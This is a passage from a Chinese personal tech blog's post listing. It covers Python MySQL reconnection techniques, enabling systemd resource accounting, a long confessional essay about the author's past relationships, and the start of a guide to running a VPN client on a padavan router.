<p>这个方法大概相当于方法2的改进版，每次操作没有重新新建con对象而是<strong>无论连接是否被MySQL关闭，都重新连接</strong>。没毛病，问题完美解决，只是也有一点点性能损失：</p>
<p>连接关闭了reconnect倒好，但是没关闭却reconnect了那不就浪费了嘛？</p>
<p>虽说如此，但是这个方法的性能会比方法2稍好一些。</p>
<h2 id="方法4：数据库操作时try…except，异常重连"><a href="#方法4：数据库操作时try…except，异常重连" class="headerlink" title="方法4：数据库操作时try…except，异常重连"></a>方法4：数据库操作时try…except，异常重连</h2><p>针对方法4，很容易就可以进行一下改进，那咱先毫无顾虑的执行，出问题了捕获异常就好了。</p>
<p>try:<br>    get_data()<br>except mysql.connector.errors.OperationalError:<br>    con.reconnect()<br>    get_data()</p>
<p>两次<code>get_data()</code>有点不雅啊，唉灵机一动：</p>
<p>try:<br>    cur.execute(‘select version()’)<br>except mysql.connector.errors.OperationalError:<br>    con.reconnect()<br>finally:<br>    get_data()</p>
<p>或者不用finally直接开始写新的语句块，也是可以的！</p>
<p>随便执行个查询操作来看看连接有没有被关闭，然后finally无论怎么都会被执行的，好办法好办法，拍案叫绝！</p>
<p>只是也稍微有那么一丁点不好，白白的让数据库执行了一个没有用的查询，多多少少还是浪费了一丢丢资源啦。</p>
<p>于是我又灵机一动，诞生了方法5.</p>
<h2 id="方法5：数据库操作之前进行con-ping-，异常重连"><a href="#方法5：数据库操作之前进行con-ping-，异常重连" class="headerlink" title="方法5：数据库操作之前进行con.ping()，异常重连"></a>方法5：数据库操作之前进行con.ping()，异常重连</h2><p>用一次con.ping()检测连接是否还在，不在的话就重新连接，finally里执行查询，哇(o゜▽゜)o☆</p>
<p>try:<br>    con.ping()<br>except mysql.connector.errors.InterfaceError:<br>    con.reconnect()<br>finally:<br>    get_data()</p>
<p>同上，不用finally直接开始写新的语句块，也是可以的！<code>con.ping()</code>的性能开销应该比较理想的。</p>
<p>需要注意的是，不同的库可能有一点不同，比如pymysql的<code>con.ping()</code>包含一个reconnect的参数，默认为True的时候就会自动重连。所以如果你使用pymysql，直接在数据库操作之前使用<code>con.ping()</code>就可以了。</p>
<p>另外一个需要注意的点，多线程情况下使用全局的con可能会触发线程安全相关的问题。以及如果涉及事务，要注意提交、回滚的操作，免得发生幻读之类的状况</p>
<h2 id="方法7：连接池"><a href="#方法7：连接池" class="headerlink" title="方法7：连接池"></a>方法7：连接池</h2><p>等有空再说吧~</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>需要注意一个问题，如果数据库开启了事务，你的应用程序涉及到了多线程等并发问题，那么在全局使用一个connection时一定要注意线程安全和事务相关的问题。一旦代码写的不完善，就很容易出现类似幻读、脏读这种事务相关的问题。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/04/13/python-longpoll-db/index/" data-id="clhp7rtie0071s2qr49ru776m" data-title="Python长期连接数据库的最不佳实践：Lost connection to MySQL server during query" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-systemd-accounting/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/04/06/systemd-accounting/index/" class="article-date">
  <time class="dt-published" datetime="2018-04-06T00:00:00.000Z" itemprop="datePublished">2018-04-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/04/06/systemd-accounting/index/">systemd - systemctl不显示内存CPU信息</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>刚刚发现树莓派上的Ubuntu Mate用systemctl status查看服务状态的时候不显示CPU和内存信息，而其他系统下都是显示的。</p>
<p><img src="/images/201804061054053.png"></p>
<p><img src="/images/2018040610540091.png"></p>
<p> </p>
<p>再来一个不显示的CentOS</p>
<p><img src="/images/2018040610540888.png"></p>
<p>后来通过<code>systemctl show</code>发现好像有个参数能设置，通过手册<code>man systemd-system.conf</code></p>
<p>查看到配置文件中写了这么一段话：</p>
<blockquote>
<p>DefaultCPUAccounting&#x3D;, DefaultBlockIOAccounting&#x3D;, DefaultMemoryAccounting&#x3D;, DefaultTasksAccounting&#x3D;</p>
<p>Configure the default resource accounting settings, as configured per-unit by CPUAccounting&#x3D;, BlockIOAccounting&#x3D;, MemoryAccounting&#x3D;</p>
<p>and TasksAccounting&#x3D;. See systemd.resource-control(5) for details on the per-unit settings.</p>
</blockquote>
<p>啊那咱去改配置文件呗？</p>
<p>sudo vim &#x2F;etc&#x2F;systemd&#x2F;system.conf</p>
<p>找到这么几行，取消注释改成yes，然后重启下或者<code>systemctl daemon-reload</code>就好了啦。</p>
<p>DefaultCPUAccounting&#x3D;yes<br>DefaultMemoryAccounting&#x3D;yes<br>DefaultTasksAccounting&#x3D;yes</p>
<p>你看都出来了吧（不过为啥<code>TasksAccounting=yes</code>都是yes了还不显示tasks数目呢？</p>
<p><img src="/images/2018040610541099.png"></p>
<p><img src="/images/2018040610541286.png"></p>
<hr>
<p>但这都不是重点！重点是，</p>
<p>谁来<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ServerSan">拯救我这个Python程序</a>？占用这么多内存，看样子应该是死锁了……</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018040610584428.jpg"><img src="/images/2018040610584428.jpg"></a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2018/04/2018040611030523.jpg"><img src="/images/2018040611030523.jpg"></a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/04/06/systemd-accounting/index/" data-id="clhp7rtkp009cs2qrg4vq9a59" data-title="systemd - systemctl不显示内存CPU信息" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-my-lovestory/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/03/10/my-lovestory/index/" class="article-date">
  <time class="dt-published" datetime="2018-03-10T00:00:00.000Z" itemprop="datePublished">2018-03-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/03/10/my-lovestory/index/">我的爱情故事</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>第一个爱情故事 [netmusic play&#x3D;’0’]3560431[&#x2F;netmusic]</p>
<p>就如标题所言，这是一个关于你我的爱情故事。这个故事拥有一个美妙的开头，拥有一个破茧成蝶的过程，但是它的结果呢？我希望会有好的结果，但是将来时，只有等它变成进行时甚至是过去时才能知晓结果。而我现在正在等待，正在努力。</p>
<p>时光倒退到N天前，那一天晚上。不是18岁的远行，但我同样不后悔那天的决定。我们的爱情开始于那一个吻，开始于多日的朝夕相处，开始于漆黑的那间屋子。</p>
<p>在那天之前，你挽着我的手臂穿过商场，我叫你老年人；我骑着自行车在蒙蒙细雨中载着你飞向学校，而你则紧紧地搂住了我的腰；你从身后抱住我，轻轻的吻了我的脸颊，跟我说我是好人。</p>
<p>似乎有了你，紧张的应考氛围就突然变得轻松了。偶然中奖得了一张电影票，于是你我去看了第一场电影，好像是特种部队2，你紧张地握着我的手；之后我期待万分的钢铁侠3也上映了，于是你抽出时间陪我去看。唯一有点遗憾的是，看到高潮的时候竟然黑屏了。</p>
<p>在最后的时光里，我们一起挺过高考。最后一科英语考完走出考场，感觉整个世界都解放了。穿着粉红色体恤的你，也在很开心的笑着。我们一起走过了这些磨难，听到了诅咒也得到了祝福，终于可以一直陪伴你了。</p>
<p>人们都总喜欢说事与愿违，事实还总是这样。报志愿的时候，我一时犹豫没有让你报考和我同市的学校。在得知录取结果的时候，感觉世界瞬间崩溃了，说后悔也没有用，我们没在一个城市。暗自庆幸的说，我们相隔说不上天涯海角，几个小时的动车高铁就可以把我带到你的身边。</p>
<p>决策胜于祈祷。如果当初是强迫你改掉报名志愿，也就没有剩下的祈祷与担忧了，也就不会有这一切了。可是，“<strong>决策胜于祈祷</strong>”可能也是太伤人了吧，无论怎么说，我们接受了异地恋。</p>
<p>在高考之后的那个暑假里，你尽可能的出来找我，那个时候你尚未公开你的爱情。</p>
<p>那一年夏天，姐姐辞职来到我家，带着外甥女。 你还记得小孩和你很合得来吗？你还记得“孩儿她舅妈”这句话吗？你还记得听到小孩稚嫩的叫着舅妈时是怎样的心动吗？</p>
<p>那一年夏天，我们一起出去玩，一起漫步走过数不清的街道，我们一起过了七夕，一起去唱歌看电影。还记得烈日当头你把我叫出来去超市吗？接近三个月的时间不算很短，仿佛人生最后的狂欢，我们也给对方留下了那么多美好的回忆。</p>
<p>然后，随着开学，我们的异地恋也算开始。那天你送我到火车站，你说你不想离开我。火车开动，我在窗口最后的边缘看见了默默流泪的你。你的身影渐渐远去，我却不知要何时才能再见。</p>
<p>最初的时候我还无法接受，可事实也就是这样。我为你许下了太多承诺。我对你说十一能回去，我会给你惊喜，我们会一起去选戒指，我会向你求婚，我会带你去海边去海边漫步，我会带你去看樱花，会与你共进烛光晚宴。我深知自己欠你太多承诺没有实现，而有一些已经过去，那些没有过去的将来时，我希望还会为你呈现。</p>
<p>不知道怀着怎样激动与兴奋的心情，十二月的时候，是我第一次自己坐火车，准确的说是动车。那是分别几个月以来第一次去看你。人们都说异地恋在一起的时间总是特别短，而在一起的时候，分分秒秒总是弥足珍贵的。我们以天为单位的倒计时，以小时甚至是分钟为单位的相聚，我很感动。</p>
<p>那一年的最后一天你说你要来找我，要陪我跨年，因为这一次跨年意味着一生一世永不分离。我仿佛看见了你像小女孩一样天真纯洁的愿望与眼神。我说给你买卧铺，个人技术问题没买到下铺，因为考试我还回去晚了。还记得那次考试帮室友打字呢，好害怕被老师抓走。</p>
<p>在姐姐家里，那晚，你坐在我的身边，趴在我的肩膀上喃喃道你困了，想让我哄你睡。可我却给索爱Mt51i刷机而跨越了一生一世，那是我们第一次跨年，如果可以，我希望我们还可以跨越更多美妙的瞬间。</p>
<p>第一个寒假里，你妈妈生病了，整个寒假也没出来太多次。第一次是1月26日，以班级聚会的借口出来到我家。后来因为社会实践，我终于可以经常看见你。你在书店做帮工，你说推荐一首很好玩的歌给我听，the fox.然后我帮你码字写报告，我们一起去逛街，一起看电影。在二月末的时候，我甚至还以修手机为名义去了次你家，哎这是看岳母啊。</p>
<p> </p>
<p>随着开学，我们讨厌的异地恋又要到来了。完成了八分之一，还有七个学期。<strong>听不到的心跳，看不见的面容，掩不住的孤独，触不及的温暖。</strong>四月份趁着动车没有变成高铁，我再次来到你的身边。最不幸的丢了钱包，挨了骂。你在车上不停的流眼泪，好像丢的不是钱包而是我，好像丢了你的钱包。不过好在后来我们都慢慢解决了这些问题，我们一起手拉手看了第一场IMAX电影，第一次真正的经历磨难。</p>
<p>五一之后你一直特别忙，可能广播台制作部的工作太繁忙，也可能有别的原因。本来25日说好了和姐姐一家人去海边玩，结果你却因为家人要去看你突然回去了。在你确认这条消息的时候，我正在帮你查着什么网课的答案，默默地留下了眼泪。那时候你的心情一定很复杂吧，不仅仅是因为提前的分离，还有你内心深处的犹豫吧。此次分离，下次相聚在何时。</p>
<p>之后我发现事情越来越不对劲，你开始不愿意理我。当我开始搜集信息的时候，你突然跟我说，要不分手吧。我拒绝了，在收集到更多信息的时候，发现你把你的爱分给了别人……你去质问你，你找借口搪塞，直到我拿出关键性证据，你也不愿意承认这一切。在你把你的手伸向别人的时候，不知道你有没有想过我的感受。或许在那时，你已经不爱我了吧。我预见了这件事情，却没预料到这个结果。</p>
<p>我瞒着姐姐，买了多坐了一站的票去看你。你告诉我你在学校里骂了我半个小时，在车上骂了我半个小时。是我的错，we create our own demons.</p>
<p> </p>
<p>我去商场买了一支玫瑰，那是我第一次送你花。你说，你很喜欢，那也是你第一次收到玫瑰。你还说你要拍照留恋，很不幸的我们把它忘在了旅馆。我安慰你说，没事，等回去了我再送你啊。</p>
<p>你还记得那次向全校广播的“音乐晚点名”吗？我留言说，无论我们相距多远，我都不会离开你，不离不弃，守侯终生。还有几天就可以看到你，还有几周就可以拥抱你，还有一辈子的时间可以跟你戏耍玩闹。我们还有一辈子的幸福生活，我爱你。</p>
<p>你说你要努力学习，你告诉我，如果你不挂科，回去就向你的父母公开恋情。我诚恳的希望你带回家的会是我，而不会是其他人。</p>
<p>对不起，我没能给你爱情中本应该有的惊喜，没能给你爱情故事里的陪伴与照顾。我欠你那么多，就像那首小诗里说的一样：有很多事情你都没做，容忍我包容我，有许多许多的事情我要回报你，等你从越南回来。但是你没有。我也没有。</p>
<p>远方的你要照顾好自己。你并不孤独，尽管我不能陪在你身边，可是你并不孤独。孤独寂寞并不能成为爱情的羁绊。</p>
<p>你是我这辈子遇见的人，我愿以我毕生之力给你应有的幸福。你还年轻，让我陪你一起白发苍苍；你还幼稚，让我陪你渐渐成熟。无论是否命中注定，你都已经成为我生命里的一部分。你是我的家人，我的家人也把你当做家庭的一分子。也许远水不解近渴，远亲不如近邻。尽我微薄之力，给你最多的幸福。</p>
<p>而在这，我可以说吗？不用等到熬过异地，我娶你可好？你并不孤独，我陪伴在你的身边。不管你多远，我守候在天边。</p>
<p>在火车站分别之前你轻轻对我说，我爱你。也许这是这个世界上最美妙的情话。我再也忍不住我的泪水，我也爱你啊。我们暑假的时候就可以见面了。</p>
<p>我相信你，张开臂膀给你回归的拥抱。</p>
<p>在经过了这一切的闹剧之后，我心生邪念，我用了一切不合理的手段去得到我想要的信息。备份，克隆，截图，上传，猜测密码。我拿到了我的杀手锏——所谓的证据。</p>
<p>在闹剧之后，你要参加一个比赛的啦啦队，于是我放假回去看你。我不知道那个时候我是有多傻，你就是随口说了一句想吃高中附近的章鱼小丸子了，于是第二天我就傻乎乎的去买了，坐着一个小时多的脏乱拥挤的绿皮车，冒着大雨送着冰凉的章鱼小丸子给你。你生气了，可是你又很感动，你说以后别这样再傻了。是不是觉得很像小说里的剧情？</p>
<p>随着我慢慢的重新相信你，我以为，可以开始新的生活了。直到十月末，同样的事情同样的人再一次上演。放弃吧，恰巧两次回家，那是我们吵的最厉害的时候——我在六楼七楼之间。你求我不要分开，你一直在哭泣，可我却面无表情，因为我真的绝望了，我不敢相信你们都做了什么，我们互相坦白甩底线，我把一切都告诉了你，我也曾是一个卑鄙小人，为了自己的欲望而不择手段。</p>
<p>怎么都没想到的是，后来因为的表白墙，他觉得被侮辱了和你大吵一架，我的目的竟然达到了，我们竟然意外的化解了所有的矛盾。生日那天你和我们十一个人在一起，T跟我们说，希望我们以后会好好的，不计前嫌。我们说，好。那时的感觉就像是初恋一样，一切都是那么清新。</p>
<p>我真的以为这一切都好了，这真的是一个关于你我的幸福爱情故事。这就是我们说的恩恩爱爱不计前嫌，是史密斯夫妇。直到Q告诉我这一切的变化：</p>
<p>所有的一切都不再是我记忆中的样子，所有的一切能表明我们曾是爱人的印记都消失了，一点都没剩下…是我太窝囊了，一点都没有给你女人想要的安全感，我知道是我做的不对做的不好…是我的错。一切都是我的软弱。</p>
<p>接近两年的努力和付出，就这样悄然结束了。从来没想到自己会如此骄傲的把你介绍给所有人，而在那时，我也从来没想过今天的我会如此的狼狈不堪…我们还是输了，是我，最终还是输给了异地输给了距离输给了曾经想都没有想过的隔阂。相爱的往日，熟悉的温度，紧紧相拥着度过的夜晚。</p>
<p>好像一场梦啊。在这些个不眠夜里，我每天起床，吃饭，生活，慢慢的，我也就不用再提醒自己起床吃饭生活。慢慢的，我也就会忘记那些曾经的温暖与甜蜜。那个跨越时空的邂逅，那些个不眠夜的痛苦。</p>
<p>在爱你的两年里，我的心从来没有变过；细水长流，爱你的这两年里，我无悔。感谢你的存在与陪伴，感谢你的亲吻与拥抱。或是此生无缘，或是阴差阳错，或许我们就注定不能修成正果。如今你带回家的人，已经不会是我了…</p>
<p>这是一个关于你我的心酸的爱情故事，它意外终结了。本以为会在某一年由我们两人一同续写，可没想到却在今天由我一人续结。纪念我们的青春爱情。</p>
<p>CH说，主动爱一个人很辛苦，每天追着他到处跑，想在他身边，结果他留给你的，全都是背影。本以为心灰意冷再寻他人，可连自己可能都不清楚他始终在心里。看着他离开你，和别人欢笑。直到看见他和其他女生在一起了，才知道嫉妒是件多么恶心的事情。</p>
<p><img src="/images/2018030604125295.jpeg" alt="http://b200.photo.store.qq.com/psb?/fec831d1-b737-4e4a-8f00-c90a396e2d35/XHJ5eucgnBpLOUQwAV03NbN3uKhpMMLoakL1fiTfVcM!/b/dA5ZPXczGwAA&amp;bo=gAJvBAAAAAAFAMo!&amp;rf=viewer_311"></p>
<p>开学当我再次回到学校的时候，想起了这里曾经站着等我的你：</p>
<p>再一次来到这里，再一次来到这个怦然心动的地方。这里，是你那年的回忆，是我昨日的记忆。</p>
<p>很快两年了。</p>
<p>再一次来到这里，再一次来到这个怦然心动的地方。可这里，<strong>已不是你那年的回忆，却依旧是我昨日的记忆。</strong></p>
<p>很快三年了。</p>
<p>在分开整整三年之后，我偶然看到你与相爱三年的另一个他分开了。我看到了你的背影，你扎着麻花辫，背着那个我还认得出来的五年前的淡蓝色书包。你说你最喜欢蓝色了。安好，愿求一切安好，愿求你不再为爱情伤，愿你幸福。</p>
<p>很快六年了。</p>
<p>短暂的重逢之后，我们又走向了不同的道路。我会永远记得我对你的亏欠，可是我知道我们再也回不到过去了。</p>
<p>Even when we’ve gone to separate ways, in my heart you’ll always stay.</p>
<p>第二个爱情故事</p>
<p>[netmusic play&#x3D;’0’]27711790[&#x2F;netmusic] 我曾经喜欢过一个人。</p>
<p>我和你相识于差不多2016年 12 月 9 日，我记得这么清楚是因为那晚我几乎没睡觉。为什么没睡觉呢，导员给我一个MacBook Pro让我给装双系统，可是又偏偏不记得密码，大概是有点兴奋吧。半夜里突然醒来，打开手机，发现她竟然也给我发了正确的密码。新的MacBook还是很好的，用BootCamp装双系统很容易，旧的型号可能会比较困难（毕竟俺不是专家嘛）。</p>
<p>下午去图书馆，有个学弟恰巧看到我，说一会可能有个学妹要找我。我说好啊。大概傍晚时刻，“偏执狂”的你来找我，是因为你也想像我一样，有一个自己的博客。于是便聊得很开心，有一种相见恨晚的感觉，毕竟能够在身边遇到一个喜欢写博客的人还是很少见的。</p>
<p>也许就是因为这些很相似的感觉，我发现我似乎喜欢上你了。《影响力》中不是说过嘛，<strong>我们喜欢与自己相似的人</strong>。不管相似之处是在观点、个性、背景还是生活方式上，我们总有这样的倾向；我们会下意识地向跟自己相似的人作出正面反应。</p>
<p>后来在 23 日，也真的是很巧的一天，我把你约出来见面。我说我能在五分钟之内帮你搭建一个“Hello World”的 博客，于是真的在五分钟内帮你搭建了 Typecho 的博客。尽管我的心意早已被你发现，也早已被拒绝，但还是觉得这样无所谓的努力挺好的。</p>
<p>然后一切就这样进行着，也许有些暧昧。为了你二次开发了一款功能强大的漂亮的 Typecho 主题，为你提供了很多学习资源，也准备了很多资料，因为对我来说你已经不是轻易地可以去放弃的人。甚至是，我没有忘记随想说的一句话，<strong>尽可能的去影响身边的人</strong>。于是我写出了很多针对性非常强的文章，或者在你的启发引导刺激下写出了很多自觉优秀的文章，有些文章甚至得到了很多人的赏识与称赞。甚至是，我带领着你来到墙外，去使用 Google，去使用 Twitter，去使用那些优秀的产品与服务，去接受自由思想与批判性思维，甚至到后来你有了一个只有我一个联系人的聊天应用：Telegram。</p>
<p>在接下来的生活中，一切突然开始变得有些愚蠢。恰巧在一年前，我偶然发现周一上午你我前后在同一间教室上课。我傻乎乎的提前去教室门口等着，只是为了能够在你下课的时候见你一面。也许是一个假期没见吧，可能那时候脑海中已经逐渐模糊了你的面容，但是在看到你从教室里走出来的时候，突然感到一丝心动：I flipped.只是很不幸的两周之后我换了教室，再也不能这样创造偶遇了。</p>
<p>如果说偶遇是偶然遇见，是小概率事件，那么我这里的偶遇，大概有一半以上都是被我硬生生的创造出来的。我精巧的计算着时间，思考着路程，像小偷一样四处张望生怕错过每一次可能的”偶遇”。四处张望寻求的虚假偶遇与昙花一现的短暂美好，想想也是很可爱的。</p>
<p>那句话是怎么说的，黄色的道路上分出了两条路，我选择了绕远的那条路，是因为我知道哪怕有万分之一遇见你的机会也是值得的。那次我绕远取快递，真的没想到回来的路上遇见了你。喂，下次走路的时候要记得看见我啊，不要让我每次都喊你的名字。</p>
<p>实习之前的那个暑假，听人说偶遇你，唉，看到别人说的偶遇，都感觉是一种幸福。曾经张望了四个月的偶遇吧。也许你不曾知道，The tiniest possibility of seeing you again excites me.</p>
<p>也许就是在这种不明所以的情况下，我开始像有了目标有了动力一样。我还记得，第一次见面的晚上你说她喜欢 Linux 和英语好的人，那时我心里暗想，这好像在说我。然后我通过了专八，找到了满意的工作，也更进一步接近了 Linux。</p>
<p> </p>
<p>我记不清我都做了些什么，但是每件事情都已经倾尽全力。我们曾经一起出来学习，也去看过 IMAX 电影。在我最难过最绝望最需要拥抱的时候，你买了樱桃陪我在操场聊天。<strong>如果那时牵起你的手，你会是什么表情，你会作何反应？</strong></p>
<p>我永远也无法忘记见到你时的兴奋感，永远也无法忘记听到你说话时的幸福感，永远也无法忘记看到你嘴角微笑时的满足感。我还记得你的眉眼，还记得你的曼妙身姿，还记得你的温暖与心跳，还记得与你相处的每一片美好记忆。</p>
<p>在某一个时间点，我以为这一切都开始发生了转变，我以为我们在一起了。我好想抱抱你啊，你说，这不是抱到了吗。我都快忘记了这种温暖的拥抱的感觉了。那次在影院里一起看的《敦刻尔克》可能是人生中最美好的一次观影体验了。</p>
<p>然而这一切并没有我想的那么简单。直到我知道你的故事，我才意识到我只完成了前两个梦想。两个月，变化的这么快，连 Telegram 都从你的手机里消失不见了，不知道一起消失不见的是否也有自由思想、独立思考与批判性思维。我甚至开始害怕发生《伤仲永》那样的事情，可能也许是我想太多了吧。</p>
<p>但这些都是我的主观看法啊，也许你只是一直很厌烦我吧，也许我只是在自作多情吧，也许你该生我的气了吧。将两个人的过去，全部破坏掉吧，快变的讨厌我吧。你的博客停留在半年前的更新，你的面容也定格在两个月之前。如果我足够理性，我应该继续帮你维护博客，去做一些尽可能的事情，而不是 “删库与跑路” 吧。不知你夜里的梦中或白天的记忆中是否有我。我魂牵梦萦的你，是否也思念着我。人若有灵魂，皆因心间有爱；不畏时间的考验，不受死亡的束缚。</p>
<p>也许无论我曾怎样努力，无论我曾怎样与你拥抱，真的要认清这一切了吧……也许你不曾记得你拉着我的手的时候，也许你不曾记得那天的日出，也许你不曾记得相拥时的温暖与心跳……如果是梦那么该多么美好啊，还可以在梦里看到你。黑暗中追寻着你的背影，那轮廓记忆犹新……此情可待成追忆，只是当时已惘然。</p>
<p>恰如溺水的人，想尽最后一番挣扎，可是我却无法改变你离去的幻梦。<strong>迷失在谎言与真相之中，我想我该死心了。一如往常就好，我放弃了，我累了，什么也不做，什么也不求。</strong>??</p>
<p>也许我该很俗的说一句，祝你幸福。可能也就这样了吧。只是，这里没有末路，你从不曾孤独，你是我曾经深爱的那个人。</p>
<p>可是，当这一切都变得复杂万分，当我渐渐了解到你对我的信任，当我逐渐了解这一切的来龙去脉、知道这些背景与故事之时，我却不知道该如何是好。<strong>眼见何事，情系何处，身在何方，心思何人。</strong>你在何方，心思何人？ 第三个爱情故事 人们都希望被别人需要，却往往事与愿违。 [netmusic play&#x3D;’0’]448917334[&#x2F;netmusic]</p>
<p>其实这里根本没有第三个爱情故事。所谓的第三个爱情故事，甚至都不存在于梦中。</p>
<p><img src="/images/2018030604125565.jpeg" alt="平匡与实栗"></p>
<p>もう やめる、もう疲れた。何もしない、何も求めない。</p>
<p>电车上的你，一点点的表情都在说着难过。你说你放弃了，累了，什么也不做，什么也不求。一边的眼睛湿润了，流泪了，车到站了，笑着说，我们走吧。</p>
<p><img src="/images/201803060412557.jpeg" alt="平匡与实栗"></p>
<p>希望被选中，希望得到认可，然而我却与理想中的自己渐行渐远了。</p>
<p>如此温柔的两个人。</p>
<p>你是我永远无法企及的梦想，却又是我孤独的生活的一丝希望与慰藉。马上就要看到你，马上就要再一次被你治愈♥</p>
<p>当再一次被你治愈之时，我就往往会想，如果此时身边能够有人给我一个拥抱就好了；在想着，如果有人需要我就好了；在想着如果能被选中、被认可就好了。可是到头来我却还是孤独一人。生于黑暗还是适应黑暗——也许我并不会从黑暗中崛起。</p>
<p>结衣酱，请你再一次治愈我。 [netmusic play&#x3D;’0’]41636941[&#x2F;netmusic]</p>
<p>其实我是一个挺懦弱、胆小怕事的人。在面试X公司之前，我几乎没有什么面试经验；来到X公司，看到身边一些人主动离职之后，我还是觉得能够留在这里挺幸运的。可能对于我来说，我需要的就是一个稳定的工作与收入了。就像对于今日子小姐来说，人生中只要有钱再稍加些谜团就够了。</p>
<p>我一直觉得能够在当前的环境下生活下去就很好。其实自己一个人也挺好嘛，生活（生存）压力比较小，无忧无虑，能够养活自己，想干嘛就干嘛，还能攒下很多钱。可能我的生活也就是这样了吧。没有什么特殊的意义，只是普普通通的生活。</p>
<p>也许这一切的过程都看起来很傻很天真，傻到足以被千夫所指，但至少我曾认真对待，至少我未曾轻浮……至少我不应该只能听到这样不经心的评论，至少我应该能够得到一点点认真的肯定。</p>
<p><strong>这三个爱情故事本不存在，都是我一个人的单相思与痴心妄想，散了吧。</strong>只是……</p>
<p><strong>下次见面时 请你重新再追求我一次</strong>?</p>
<p><img src="/images/2018030604125651.jpeg" alt="https://pbs.twimg.com/media/DWKmGjkXkAArVn8.jpg"></p>
<p>第四个爱情故事</p>
<p>我以为这次重逢会有结果，可是并没有如我所愿。</p>
<p>谢谢你带给了我这么多美妙的体验与经历，就让这一切在此结束吧。</p>
<p>迷失。</p>
<p>第四个爱情故事</p>
<p>认识你2600多天，从来没想到我会被你的一句话触动到，从来没想到我会这样迅速的迷恋于你。</p>
<p>你的一言一语，你的每一朵小花花，每一颗小心心，每一句关怀和问候，都像磁性越来越强的磁铁，越来越快、越来越强地吸引着我。我不知道终点是什么，我不知道最终的碰撞会怎样，我只知道这一切仿佛就是物理定律，无法抵抗。</p>
<p>可是，我心里很清楚，这是我不应该做的事情，我不可以喜欢上不应该喜欢的人。我已经在拼命克制了啊。</p>
<hr>
<p>希望疫情赶紧过去，好在夏日里不顾一切去见一个人，去拥抱对方，说我好喜欢你。</p>
<p>我们说好了要一起走的，我也不会离开你，你不会抛下我的对吧。</p>
<p>I’m with you all the way You’re with me all the way You came and saved me through the night ……. So I promise you I’ll be by your side</p>
<blockquote>
<p>I wonder if I come to you at night, in dreams;</p>
<p>in the day, as memories.</p>
<p><strong>Do I haunt your hours the way you haunted mine?</strong></p>
<p>If we have souls, they are made of the love we share.</p>
<p>Undimmed by time.</p>
<p>Unbound by death.</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/03/10/my-lovestory/index/" data-id="clhp7rthl0057s2qreclc9sl3" data-title="我的爱情故事" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-padavan-vypr/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/02/23/padavan-vypr/index/" class="article-date">
  <time class="dt-published" datetime="2018-02-23T00:00:00.000Z" itemprop="datePublished">2018-02-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/gfw/">gfw</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/02/23/padavan-vypr/index/">在路由器（padavan）上使用VPN客户端</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p>好好的，为什么要在路由器上挂VPN呢？</p>
<ul>
<li>我有一个<a target="_blank" rel="noopener" href="https://dmesg.app/y1s.html">刷了padavan的联想y1s</a></li>
<li>我买了个Xbox，想玩外服游戏ε&#x3D;(´ο｀*)）)唉以及加速下载数字版游戏</li>
<li>有点闲的没事干</li>
</ul>
<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>咱需要点啥呢……</p>
<ul>
<li>需要一个刷了padavan的路由器（或者是支持OpenVPN客户端的路由器）</li>
<li>需要<a target="_blank" rel="noopener" href="https://dmesg.app/all-platform-scientific-internet-all-in-one.html/3">一个VyprVPN账号</a>，或者是其他能用的OpenVPN（比如说我搭建在腾讯云的也算呗）</li>
<li>还需要一台电脑（这不废话嘛）</li>
</ul>
<h2 id="一些背景知识"><a href="#一些背景知识" class="headerlink" title="一些背景知识"></a>一些背景知识</h2><p>首先，<a target="_blank" rel="noopener" href="https://dmesg.app/all-platform-scientific-internet-all-in-one.html/3">VyprVPN</a>支持OpenVPN、L2TP&#x2F;IPSec、PPTP以及自创的Chameleon协议，<strong>Chameleon穿透GFW的效果还是比较理想的</strong>。</p>
<p>既然是标准的VPN协议，那我们就拿OpenVPN做例子试试在路由器上部署啦。</p>
<h3 id="Router-App"><a href="#Router-App" class="headerlink" title="Router App"></a>Router App</h3><p>非常不幸的是，VyprVPN Router App仅支持Tomato by Shibby这一个衍生固件，所以还是不要尝试了吧，port会很累的。</p>
<h2 id="Padavan的VPN客户端设置"><a href="#Padavan的VPN客户端设置" class="headerlink" title="Padavan的VPN客户端设置"></a>Padavan的VPN客户端设置</h2><p><img src="/images/2018022308363418.png"></p>
<p>我们需要配置如下信息：</p>
<ul>
<li>VPN协议</li>
